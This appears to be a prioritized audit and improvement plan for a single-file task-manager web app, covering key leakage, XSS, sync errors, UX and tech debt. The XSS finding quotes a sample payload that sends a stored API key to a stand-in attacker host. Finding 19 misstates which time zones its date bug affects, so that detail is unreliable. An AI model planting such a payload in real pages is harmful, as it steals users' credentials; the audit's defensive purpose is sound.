# Givelink / Task OS — Improvement Plan

> Scanned: 2026-05-30  
> Scope: `index.html` (12,888 lines), `givelink.html` (1,755 lines), `sw.js`, `vercel.json`  
> No PostHog data or `/docs` folder found.

---

## 🔥 P0 — Ship this week (bugs breaking user flows)

### 1. Claude API key is synced to Supabase in plaintext
- **What**: The entire `S` state object—including `S.claudeKey`—is pushed to the cloud database on every save.
- **Where**: `index.html:8603` — `data: S` in the Supabase push body; `index.html:2036` — `claudeKey:''` declared in the top-level state.
- **Why it matters**: Any Supabase collaborator, anyone with the anon key + user ID, or a future security incident can read your Anthropic API key. Leaked `sk-ant-*` keys lead to unauthorized charges with no recourse.
- **Effort**: S
- **Suggested fix**:
  - Before pushing to Supabase, strip `claudeKey` (and any other credentials) from the payload: `const {claudeKey, ...safeState} = S; body = [{data: safeState, ...}]`.
  - Move `claudeKey` to its own `localStorage` key (`taskos_claude_key`) entirely outside the `S` object so it can never accidentally be synced.

---

### 2. XSS via unescaped user data in innerHTML render paths
- **What**: Task and goal titles are interpolated directly into `innerHTML` strings in several render functions without sanitization, despite an `esc()` helper existing in the codebase.
- **Where**: `index.html:2885` (`${t.title}` in step-1 review body), `index.html:2892` (`${t.title}` in step-2 backlog), `index.html:2894` (`${g.title}` in goal progress), `index.html:3128` (toast with raw `t.title` inside `<strong>`), `index.html:2062` (`t.title.slice(0,45)` in `<option>` elements).
- **Why it matters**: A task titled `</div><img src=x onerror="fetch('https://evil.example/'+S.claudeKey)">` executes in the browser. This is self-XSS today, but becomes remote XSS if any Supabase-synced data is ever shared or rendered for another user.
- **Effort**: S
- **Suggested fix**:
  - Audit all template literals that set `innerHTML` and wrap every user-supplied string with `esc()`. The helper is already defined — just use it consistently.
  - Add a lint rule or grep CI check: `innerHTML.*\$\{(?!esc\()` to catch regressions.

---

### 3. Givelink brand identity absent from `givelink.html`
- **What**: The sprint board shown to nonprofit partners uses a generic blue (`#3b82f6`) as its primary accent. None of the Givelink brand colors (purple `#6B3FA0`/`#5718CA`, pink `#C2185B`/`#E353B6`) appear anywhere in the file.
- **Where**: `givelink.html:6` (`theme-color: #3b82f6`), `givelink.html:17` (`--accent: #3b82f6`), `givelink.html:25` (logo in `color: var(--accent)`), `givelink.html:135` (FAB shadow `rgba(59,130,246,.4)`).
- **Why it matters**: When nonprofit founders or investors open this URL, the product looks like a generic template rather than the Givelink brand. First impressions at demos matter; mismatched colors erode trust.
- **Effort**: S
- **Suggested fix**:
  - Replace `:root` accent: `--accent: #5718CA; --accent-hover: #6B3FA0;`.
  - Replace FAB box-shadow with purple tint: `rgba(87, 24, 202, 0.4)`.
  - Update `theme-color` meta to `#5718CA`.
  - The "partnerships" pillar using `--pr: #f472b6` is close to brand pink but should be `#E353B6`. The "no pink on purple" rule is safe here since pink only appears on dark navy (`#070d1a`) backgrounds.

---

### 4. Sync errors are invisible while working
- **What**: When Supabase sync fails (network outage, expired token, quota), the error is written only to a small status label inside the Settings modal — nowhere visible during normal use.
- **Where**: `index.html:8625` — `catch(e){_sbSetStatus('⚠ '+e.message);}` and `index.html:8633` — `.catch(e=>_sbSetStatus(...))`.
- **Why it matters**: A user adds 20 tasks over an hour, Supabase token expires silently, they switch devices — all that work is gone. The data loss is invisible.
- **Effort**: S
- **Suggested fix**:
  - On sync failure, call `toast('☁️ Cloud sync failed — ' + e.message, 5000)` in addition to updating the status label.
  - Track consecutive failures; after 3, show a persistent banner: "⚠️ Not syncing — check Settings".

---

## ⚡ P1 — High ROI (UX friction blocking conversion)

### 5. No onboarding for new users
- **What**: A first-time user lands on a dashboard with 40+ nav items, 0 tasks, and no guidance on where to start.
- **Where**: `index.html` — `renderDash()` function (around line 2490); no onboarding state check exists.
- **Why it matters**: New demo visitors or trial users bounce immediately. The feature density that makes the app powerful also makes it impenetrable at first glance.
- **Effort**: M
- **Suggested fix**:
  - Add an `S.onboarded` flag. On first load (`!S.onboarded && S.tasks.length === 0`), show a focused welcome modal with 3 steps: set your top goal, add your first task, optionally connect Claude.
  - Seed 2-3 example tasks with a "clear examples" button to give the UI context before the user has real data.
  - Add an inline tip card to the empty dashboard state directing to Capture view.

---

### 6. Service worker cache key must be manually bumped on every deploy
- **What**: `sw.js` hardcodes the cache version as a date string. If code is deployed without also updating this string, all users continue serving stale HTML from cache.
- **Where**: `sw.js:1` — `const CACHE = 'task-os-20260530';`
- **Why it matters**: A bug fix pushed to Vercel won't reach users who already have the old SW installed until you remember to bump the date in `sw.js`. This has likely already caused confusion.
- **Effort**: S
- **Suggested fix**:
  - Replace with a hash or build timestamp: e.g., `const CACHE = 'task-os-v' + '{{BUILD_HASH}}';` generated at deploy time.
  - Simplest zero-build approach: add a comment at the top of `sw.js` — `// BUMP THIS ON EVERY DEPLOY:` — and change to a semantic version `task-os-v1.2.3` that you increment intentionally, making the contract explicit.

---

### 7. givelink.html CRM Kanban has no mobile affordance for horizontal scroll
- **What**: The CRM pipeline is a 6-column Kanban grid with `overflow-x: auto`, but there is no visual scroll indicator, no swipe snap points, and columns have a fixed `min-width: 160px` that stacks poorly on small screens.
- **Where**: `givelink.html:197-200` — `.crm-kanban` styles.
- **Why it matters**: CRM is a key view for tracking nonprofit pipeline. If it's broken on mobile during a meeting or field visit, deal data can't be updated in real time.
- **Effort**: S
- **Suggested fix**:
  - Add `scroll-snap-type: x mandatory` to `.crm-kanban` and `scroll-snap-align: start` to `.crm-col`.
  - Add `@media(max-width:768px)` rule: reduce column count to 3 visible with `min-width: 44vw` to make scrollability obvious.
  - Add a subtle `→` scroll hint that fades out after first scroll.

---

### 8. No keyboard shortcut for quick-capture (the most common action)
- **What**: Adding a task — the single most frequent action — requires clicking the FAB or navigating to Capture. There's no global keyboard shortcut to open the add-task modal.
- **Where**: `index.html` — keyboard shortcuts handler exists (around line 9700+) but `openAdd()` is not wired to any key.
- **Why it matters**: Power users (the core audience) expect `N` or `C` to open capture instantly. Every extra click on a tool you use 20x/day creates measurable friction.
- **Effort**: S
- **Suggested fix**:
  - In the existing `keydown` handler, add `if(key==='n'&&!inInput) openAdd();` and `if(key==='c'&&!inInput) nav('capture');`.
  - Update the keyboard shortcuts modal to list the new bindings.

---

### 9. iOS keyboard pushes modal content off-screen
- **What**: On iPhone, when a text input inside a modal receives focus the virtual keyboard slides up and obscures most of the modal, including the Save button.
- **Where**: `index.html` — `.mo` and `.md` CSS (around line 350), no `env(keyboard-inset-height)` compensation.
- **Why it matters**: The add-task and add-goal flows are the two highest-frequency interactions. If the Save button is hidden on the device most likely used on the go, tasks don't get saved.
- **Effort**: S
- **Suggested fix**:
  - Add `@supports (height: 100dvh) { .mo { height: 100dvh; } }` to use dynamic viewport height.
  - On mobile breakpoint, add `padding-bottom: env(keyboard-inset-height, 0px)` to `.md`.
  - Alternatively, position `.mf` (modal footer) as `sticky; bottom: 0` so Save is always visible within the scrollable modal.

---

## 🛠 P2 — Code health (tech debt slowing velocity)

### 10. Monolithic 12,888-line single-file app
- **What**: All CSS (~2,000 lines), HTML (~5,000 lines), and JavaScript (~6,000 lines) live in one `index.html`. Every change to any layer requires navigating this file.
- **Where**: `index.html` — entire file.
- **Why it matters**: Adding a new view currently means scrolling through thousands of lines to find the right section. Onboarding a collaborator or debugging a specific feature is a multi-minute search every time.
- **Effort**: L
- **Suggested fix**:
  - As a first step (no build tooling needed), extract the `<style>` block into `styles.css` and link it. This alone cuts the file in half and is instantly reversible.
  - Extract JavaScript into a `app.js` with a `<script src="app.js">` tag.
  - Long-term: introduce a minimal build step (esbuild or Vite) to enable proper modules without changing the deployment model.

---

### 11. State deserialization merges remote data with no schema validation
- **What**: `sbSyncNow()` merges the remote Supabase payload directly into `S` with `S = {...S, ...remote.data}` without validating field types or expected keys.
- **Where**: `index.html:8615`.
- **Why it matters**: A corrupted or maliciously crafted Supabase record can overwrite critical state fields (e.g., set `tasks` to `null`), breaking the entire app silently. Even an accidental schema mismatch from an old backup can cause hard-to-debug render crashes.
- **Effort**: S
- **Suggested fix**:
  - Before merging, validate that `remote.data` is a plain object and that critical arrays (`tasks`, `goals`, `habits`) are actually arrays: `if (!Array.isArray(remote.data.tasks)) remote.data.tasks = S.tasks;`.
  - Wrap the merge in a try/catch with a fallback to local state and a toast notification.

---

### 12. `console.warn` debug output left in production
- **What**: Four `console.warn` calls remain active in production code, polluting the browser console and potentially leaking state information in error messages.
- **Where**: `index.html:2092` (theme listener), `index.html:2107` (corrupt localStorage), `index.html:2950` (`_wizSave` error), `index.html:3023` (FAB action).
- **Why it matters**: Production consoles should be clean. These emit on normal code paths (e.g., every time localStorage is first read), making real errors harder to spot.
- **Effort**: S
- **Suggested fix**:
  - For expected error paths (corrupt localStorage, theme fallback), convert to silent handling: just apply the default and move on.
  - For genuinely unexpected errors (`_wizSave`, FAB), keep the warn but gate it: `if (location.hostname !== 'localhost') return;`.

---

### 13. Full re-render on every state change
- **What**: `refresh()` re-renders all active views on every `save()` call, regardless of what changed. Adding a single task re-renders the dashboard, all-tasks list, goals, habits, and every other visible panel.
- **Where**: `index.html` — `refresh()` function (around line 2453) called after every state mutation.
- **Why it matters**: Currently fine with small datasets. As the state object grows (it already has 80+ fields), this will cause noticeable jank, especially on lower-end mobile devices.
- **Effort**: M
- **Suggested fix**:
  - Add a `refresh(viewName)` parameter so callers can scope re-renders: `save(); refresh('dashboard');` instead of re-rendering everything.
  - As a short-term fix, only re-render the currently visible view: `renderView(currentView)` instead of calling all render functions.

---

### 14. No tests for critical persistence paths
- **What**: Zero test files exist for the save/load cycle, Supabase sync conflict resolution, or the `toggleDone`/XP award flow — the most business-critical paths in the app.
- **Where**: Entire repository — no `*.test.js`, `*.spec.js`, or test directory.
- **Why it matters**: A silent regression in `save()` or the conflict resolution logic (`S._updatedAt` comparison) could cause data loss that goes undetected until a user notices missing data days later.
- **Effort**: M
- **Suggested fix**:
  - Add a single `tests.html` page with a minimal test harness (no build tooling needed) covering: save → reload → assert data matches; `sbSyncNow()` merge prefers newer `_updatedAt`; `toggleDone()` increments XP.
  - Run these manually before any deploy that touches state or sync logic.

---

### 15. Inline `onclick` handlers prevent any event architecture
- **What**: Every interactive element uses `onclick="functionName()"` attribute strings. There are no event listeners registered in JavaScript.
- **Where**: Throughout `index.html` — thousands of inline handlers.
- **Why it matters**: Cannot add analytics hooks, cannot debounce interactions globally, cannot add keyboard-accessible focus management, and cannot write integration tests without a real browser. Adding cross-cutting behavior (e.g., "log every button click to PostHog") requires touching every element.
- **Effort**: L
- **Suggested fix**:
  - Don't rewrite everything at once. For new features, use `addEventListener` instead of `onclick`.
  - Add a single delegated listener on `document` that intercepts `data-action` attributes to enable progressive migration: `<button data-action="openAdd">` → handled centrally.

---

## 💡 P3 — Nice to have

### 16. PostHog analytics not implemented
- **What**: `S.givelinkMetrics` tracks product numbers manually, but no event tracking (page views, feature usage, funnel drop-offs) is instrumented.
- **Where**: `index.html` — no PostHog snippet or analytics calls anywhere; `vercel.json` CSP would need to whitelist `https://app.posthog.com`.
- **Why it matters**: Without analytics, iteration on the product is guesswork. Which views do users actually visit? Where do they abandon the weekly review wizard?
- **Effort**: S
- **Suggested fix**:
  - Add PostHog snippet to `<head>` with `capture_pageview: false`.
  - Instrument `nav(v)` to fire `posthog.capture('view_opened', {view: v})` and `callClaude()` to fire `posthog.capture('ai_used', {feature})`.
  - Add `app.posthog.com` and `us.i.posthog.com` to the CSP `connect-src` in `vercel.json`.

---

### 17. No build / minification pipeline
- **What**: `index.html` is served as-is at 12,888 unminified lines. Inline styles, verbose HTML attribute names, and whitespace add ~30% unnecessary payload.
- **Where**: `index.html`, `sw.js`, `vercel.json` (no build config).
- **Why it matters**: Mobile users on slower connections feel a longer parse-and-render time on first load. The PWA install cache stores the unminified version.
- **Effort**: M
- **Suggested fix**:
  - Add a one-command minification step using `html-minifier-terser`: `npx html-minifier-terser index.html -o dist/index.html --collapse-whitespace --minify-css --minify-js`.
  - Wire this into a `package.json` deploy script so Vercel runs it automatically.

---

### 18. `prefers-reduced-motion` not fully honoured
- **What**: Confetti animations (`_fireConfetti()`), entrance animations (`.fi`), and spin animations (`.spin-icon`) fire regardless of the user's motion preference.
- **Where**: `index.html` — `_fireConfetti()` function; CSS `@keyframes fi` and `@keyframes sp` rules; no `@media (prefers-reduced-motion: reduce)` override.
- **Why it matters**: Users with vestibular disorders can experience nausea from unexpected motion. This is an accessibility requirement under WCAG 2.1 SC 2.3.3 (AAA) and is increasingly expected on professional tools.
- **Effort**: S
- **Suggested fix**:
  - Add to CSS: `@media (prefers-reduced-motion: reduce) { *, *::before, *::after { animation-duration: 0.01ms !important; transition-duration: 0.01ms !important; } }`.
  - In `_fireConfetti()`, guard: `if (window.matchMedia('(prefers-reduced-motion: reduce)').matches) return;`.

---

### 19. Recurring task date arithmetic ignores timezone
- **What**: When a recurring task is completed, the next due date is computed by incrementing a `new Date(t.dueDate)` without timezone normalization.
- **Where**: `index.html:3153-3157` — date increment logic in `toggleDone()`.
- **Why it matters**: If the user is in UTC+3 and completes a task late at night, `new Date('2026-05-30')` is parsed as midnight UTC, which is already "yesterday" in UTC+3 — causing the next recurrence to land one day early. Affects anyone outside UTC.
- **Effort**: S
- **Suggested fix**:
  - Parse the date string by splitting on `-` rather than via `new Date()` to avoid UTC vs. local midnight ambiguity: `const [y,m,d] = t.dueDate.split('-').map(Number); const dt = new Date(y, m-1, d);`.
  - Then increment and re-serialize: `dt.setDate(dt.getDate() + 1); next.dueDate = dt.toLocaleDateString('en-CA');` (`en-CA` gives `YYYY-MM-DD` in local time).
